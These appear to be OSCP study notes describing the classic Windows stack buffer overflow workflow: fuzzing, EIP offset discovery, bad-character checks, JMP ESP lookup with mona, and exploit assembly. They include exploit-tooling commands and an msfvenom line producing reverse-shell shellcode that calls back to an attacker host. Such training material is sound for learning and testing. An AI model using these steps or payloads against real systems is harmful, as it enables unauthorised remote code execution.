# OSCP buffer overflow notes

Notes of the buffer overflow process.

## Fuzzing the target

Send enough data to the target to trigger the overflow and crash it. Start with sending a payload of `A` (`0x41`) characters for easy identification inside the debugger (sample: `fuzzer.py`). Monitor the target with a debugger  and take note of how much data is needed to cause the crash.

Debuggers:
 - Immunity Debugger (https://www.immunityinc.com/products/debugger/)
 - OllyDbg (http://www.ollydbg.de/version2.html)
 - WinDbg (https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools).

## Take control of EIP

After crashing the application, we need to find exactly how much data is needed to overwrite EIP. This is achieved by changing the payload from `A` characters to a unique string (sample: `eip_offset.py`). When the target crashes, EIP will hold a substring of the unique string (e.g: little-endian `74414674` (`t6At`)). The offset of this substring within the unique string will tell us how much data is needed to overwrite EIP and take control.

Generate the unique string of the required length :

`msf-pattern_create -l <size of data to cause crash>`

After the crash, find the offset of the substring held by EIP at crash time:

`msf-pattern_offset -l <size of data to cause crash> -q <value of EIP>`

Use this offset to create a proof of concept: crash the target and overwrite EIP with 4 `X` (`0x58`) characters (sample: `eip_control.py`).

## Check for space for shellcode payload

Once EIP can be controlled, we need to check there is sufficient space for the shellcode payload. The shellcode we'll use is <400 bytes so arbitrarily round the required space to 500 bytes. The required space can be checked by sending an additional 500 bytes of `C` (`0x43`) characters after the initial buffer overflow. For easier visual checking, append `FOXTROT` (sample: `shellcode_space.py`).

## Find badchars

The bad characters must be identified before the shellcode payload can be sent to the target. Badchars are any characters that can't be used by the target due to the protocols used, how the application handles the received input, etc, and this will break the exploit. Identifying the badchars is a process of elimination: use the sample `badchars_check.py` to send a list of all characters to the target, debug the target to review the received data, and any characters that break the input can be considered "bad". Remove the badchars from the list and repeat the process until all badchars have been found.

Note: `badchars_check.py` includes NULL (`0x00`) as the second character in the badchars list to make it easier to identify if the NULL character is bad, instead of the entire list failing to be received by the target.

## Redirect EIP with JMP ESP

After identifying the badchars, we need to find a reliable JMP ESP instruction that can be leveraged to change the execution flow of the target: if EIP can be redirected to the JMP ESP, and ESP points to the start of our shellcode, then our shellcode will be executed.

In Immunity Debugger, use mona to find a pointer to JMP ESP that doesn't include any of the badchars:

`!mona jmp -r esp -cpb "\x00"`

We can also use mona to see a list of modules used by the target, then review this list to identify unprotected modules:

`!mona modules`

When an unprotected module has been found, use mona to find a pointer to JMP ESP (opcode `\xff\xe4`) within the module:

`!mona find -s "\xff\xe4" -m "<name of module>"`

When a pointer has been found, take note of the address.

## Create exploit script

The exploit script (sample: `exploit.py`) will use a 12 byte nopsled to allow room for the shellcode decoder.

The JMP ESP pointer address will replace the original 4 `X` characters used to overwrite EIP. Ensure the address is converted to little-endian format.

Generate the reverse shell shellcode using msfvenom, ensuring to encode the shellcode so all badchars are excluded:

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"`

Copy the shellcode to the exploit script and get the reverse shell ready to catch the incoming connection.